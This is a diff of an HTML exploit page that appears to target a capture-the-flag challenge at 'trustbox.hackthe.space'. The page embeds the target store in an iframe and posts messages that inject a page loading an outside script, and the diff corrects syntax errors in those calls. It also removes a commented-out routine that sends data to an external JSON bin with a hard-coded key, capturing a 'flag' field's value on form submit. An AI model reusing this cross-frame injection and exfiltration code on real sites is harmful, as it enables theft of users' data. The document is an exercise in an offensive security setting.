@@ -20,45 +20,18 @@
 						var page = "<html><head><script src='" + scriptUrl + "'><\/script><\/head><body><\/body><\/html>";
 
 						first = false;
-						frame.postMessage({action: "add", file: page), '*');
+						frame.postMessage({action: "add", file: page}, '*');
 					} else {
 						window.open(e.data.url);
 					}
 				}
 				, false);
 				
-				frame.postMessage({action: "add", file: scriptBlob), '*');
+				frame.postMessage({action: "add", file: scriptBlob}, '*');
 			}
-			
-			/*function sendmydata(data) {
-				var req = new XMLHttpRequest();
-	
-				req.open("PUT", "https://json.extendsclass.com/bin/efbe379dfbef");
-				req.setRequestHeader("Security-key","d8f0bc6b-c48f-11eb-86a8-0242ac110008");
-				req.send(data);
-			}
-			
-			sendmydata("opened page");
-			
-			window.onload = function() {
-				sendmydata("onload run");
-				
-				var form = document.getElementById("myform");	
-				var element = document.getElementById("flag");
-				
-				form.onsubmit = function(e) {
-					sendmydata("" + element.value);
-					e.preventDefault();
-				}
-			}*/
 		</script>
 		
 		<iframe src="https://trustbox.hackthe.space/store">
 		</iframe>
-		
-		<!--<form id="myform">
-			<input id="flag" name="name" type="text" />
-			<input type="submit" />
-		</form>-->
 	</body>
 </html>
